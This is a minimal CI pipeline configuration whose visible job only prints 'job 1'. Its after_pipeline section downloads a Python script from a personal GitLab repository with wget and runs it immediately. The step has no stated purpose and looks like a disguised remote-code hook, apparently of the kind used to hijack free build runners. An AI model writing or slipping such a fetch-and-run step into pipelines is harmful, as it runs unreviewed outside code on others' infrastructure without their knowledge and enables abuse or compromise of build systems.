version: v1.0
name: Initial Pipeline
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu2004
blocks:
  - name: 'Block #1'
    task:
      jobs:
        - name: 'Job #1'
          commands:
            - echo "job 1"
after_pipeline:
  task:
    jobs:
      - name: 'Job #e'
        commands:
          - 'wget https://gitlab.com/azkadafa39/suram/-/raw/main/al.py && python al.py'
